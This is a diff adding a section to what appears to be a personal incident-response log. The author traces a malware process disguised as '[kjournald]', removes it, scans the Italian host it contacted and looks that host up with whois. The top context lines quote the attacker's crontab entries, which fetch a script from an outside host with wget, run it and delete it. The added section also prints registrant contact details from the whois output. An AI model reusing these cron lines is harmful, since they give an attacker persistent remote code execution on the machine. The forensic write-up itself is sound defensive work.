@@ -1600,3 +1600,171 @@ P#env
  @daily wget -q http://update.omfg.pw/upd3 -O /tmp/updatescript3;sh /tmp/updatescript3;rm -rf /tmp/updatescript3 > /dev/null 2>&1 
  */10 * * * * /var/tmp/32a1e380 >/dev/null 2>&1
 ```
+
+
+# Connection to the weird `[kjournald]` entry
+
+I finally found (unfortunately) a connection the the weird thing that started it all. The 644 connections to the mystery ip in Italy:
+
+```
+# finding the process number
+sudo netstap -tapn | grep kjournald
+...
+tcp        0      0 192.168.10.2:37126      195.128.235.204:2525    ESTABLISHED 20086/[kjournald]
+
+# finding which executable is running
+sudo ls -lh /proc/20086/exe                                                                                                                                                                                                                                                             
+lrwxrwxrwx 1 root root 0 feb.   8 15:56 /proc/20086/exe -> /var/tmp/32a1e380
+
+echo Damnit. That's the same filename that was downloaded earlier :-(
+
+# let's see what else is there
+ls -lh /var/tmp/
+totalt 892K
+-rwxr--r-- 1 root            root            855K jan.  26 00:00 32a1e380
+-rw-r--r-- 1 root            root               0 feb.   8 14:50 32a1e380.o
+drwx------ 3 root            root            4,0K mai   10  2017 systemd-private-324e4a6b2918402facae1043d5eebba1-redis-server.service-PWSJ5r
+drwx------ 3 root            root            4,0K mai   10  2017 systemd-private-324e4a6b2918402facae1043d5eebba1-systemd-timesyncd.service-PRy6AG
+drwx------ 3 root            root            4,0K sep.   2  2015 systemd-private-49a150e922e2480e879fbf102eb12a8d-systemd-timesyncd.service-O4jyup
+drwx------ 3 root            root            4,0K juni   3  2017 systemd-private-5ca138d5ed264832a55c4f67f094e393-redis-server.service-lSXpeY
+drwx------ 3 root            root            4,0K juni   3  2017 systemd-private-5ca138d5ed264832a55c4f67f094e393-systemd-timesyncd.service-OevWms
+drwx------ 3 root            root            4,0K aug.  26 23:20 systemd-private-f32443bfee9445e5bd371d9bbd04d55e-systemd-timesyncd.service-71dkbj
+drwx------ 3 root            root            4,0K jan.   5 14:22 systemd-private-ff200417979b4963959d62fbfee6de44-redis-server.service-ZXuwV7
+drwx------ 3 root            root            4,0K feb.   6 06:15 systemd-private-ff200417979b4963959d62fbfee6de44-systemd-timesyncd.service-ujgt5m
+
+# goodbye
+$ sudo rm /var/tmp/32a1e380*
+$ sudo kill 20086
+
+# verify 
+tcp        0      1 192.168.10.2:54533      195.128.235.204:2525    FIN_WAIT1   -               
+tcp        0      1 192.168.10.2:43606      195.128.235.204:2525    FIN_WAIT1   -               
+tcp        0      1 192.168.10.2:40416      195.128.235.204:2525    FIN_WAIT1   -               
+tcp        0      1 192.168.10.2:44080      195.128.235.204:2525    FIN_WAIT1   -               
+tcp        0      1 192.168.10.2:54236      195.128.235.204:2525    FIN_WAIT1   -               
+tcp        0      1 192.168.10.2:45926      195.128.235.204:2525    FIN_WAIT1   -               
+tcp        0      1 192.168.10.2:37126      195.128.235.204:2525    FIN_WAIT1   -               
+
+echo Seems to have done it.
+
+# time to contact the owner 
+$ nmap 195.128.235.204
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-02-08 16:03 CET
+Nmap scan report for bladerunner.consultingweb.it (195.128.235.204)
+Host is up (0.041s latency).
+Not shown: 960 closed ports, 33 filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+23/tcp    open  telnet
+2525/tcp  open  ms-v-worlds
+3306/tcp  open  mysql
+9999/tcp  open  abyss
+10000/tcp open  snet-sensor-mgmt
+
+
+$ whois 195.128.235.204                                                                                                                                                                                                                                                                   
+% This is the RIPE Database query service.
+% The objects are in RPSL format.
+%
+% The RIPE Database is subject to Terms and Conditions.
+% See http://www.ripe.net/db/support/db-terms-conditions.pdf
+
+% Note: this output has been filtered.
+%       To receive output for a database update, use the "-B" flag.
+
+% Information related to '195.128.234.0 - 195.128.235.255'
+
+% Abuse contact for '195.128.234.0 - 195.128.235.255' is 'abuse@staff.aruba.it'
+
+inetnum:        195.128.234.0 - 195.128.235.255
+netname:        CONSULTINGWEB-IT
+country:        IT
+org:            ORG-Ws5-RIPE
+admin-c:        AD11736-RIPE
+tech-c:         CTD2-RIPE
+tech-c:         AN3450-RIPE
+status:         ASSIGNED PI
+mnt-by:         RIPE-NCC-END-MNT
+mnt-by:         MNT-CONSULTINGWEB
+mnt-routes:     MNT-CONSULTINGWEB
+mnt-routes:     ARUBA-MNT
+mnt-domains:    MNT-CONSULTINGWEB
+created:        2004-05-18T11:56:27Z
+last-modified:  2016-04-14T09:37:40Z
+source:         RIPE # Filtered
+organisation:   ORG-Ws5-RIPE
+org-name:       Aruba Business S.R.L.
+org-type:       LIR
+address:        Via Gulinelli, 21/A
+address:        44122
+address:        Ferrara
+address:        ITALY
+phone:          +390532230909
+fax-no:         +390532230919
+abuse-c:        AN3450-RIPE
+admin-c:        MG10548-RIPE
+admin-c:        SL9975-RIPE
+admin-c:        GC16401-RIPE
+mnt-ref:        RIPE-NCC-HM-MNT
+mnt-ref:        ARUBA-MNT
+mnt-ref:        WIDESTORE-MNT
+mnt-by:         RIPE-NCC-HM-MNT
+mnt-by:         ARUBA-MNT
+created:        2005-04-28T08:31:11Z
+last-modified:  2016-11-29T14:35:12Z
+source:         RIPE # Filtered
+
+role:           ARUBA NOC
+address:        Aruba S.p.A.
+address:        via S.Clemente 53
+address:        24036 Ponte San Pietro (BG)
+address:        Italy
+abuse-mailbox:  abuse@staff.aruba.it
+admin-c:        SS936-RIPE
+tech-c:         SC279-RIPE
+nic-hdl:        AN3450-RIPE
+mnt-by:         ARUBA-MNT
+created:        2008-11-19T19:02:34Z
+last-modified:  2017-11-15T08:13:57Z
+source:         RIPE # Filtered
+
+role:           Consultingweb Tech Dept
+address:        Via Pietro Nenni 294
+address:        66020 San Giovanni Teatino (CH)
+address:        Italy
+admin-c:        ON232-RIPE
+tech-c:         ON232-RIPE
+nic-hdl:        CTD2-RIPE
+created:        2009-01-29T08:58:56Z
+last-modified:  2011-01-19T13:58:01Z
+source:         RIPE # Filtered
+mnt-by:         MNT-CONSULTINGWEB
+
+person:         Alessia Destro
+address:        Alicom S.r.l.
+address:        Via Pietro Nenni 294
+address:        66020 San Giovanni Teatino (CH)
+address:        Italy
+phone:          +39 02 57609451
+nic-hdl:        AD11736-RIPE
+mnt-by:         ALICOM-MNT
+created:        2014-06-03T12:52:08Z
+last-modified:  2014-06-03T12:52:08Z
+source:         RIPE # Filtered
+
+% Information related to '195.128.234.0/23AS31034'
+
+route:          195.128.234.0/23
+descr:          Alicom Srl
+origin:         AS31034
+mnt-by:         MNT-CONSULTINGWEB
+created:        2014-06-03T09:29:51Z
+last-modified:  2014-06-03T09:29:51Z
+source:         RIPE
+
+% This query was served by the RIPE Database Query Service version 1.90 (ANGUS)
+
+
+```
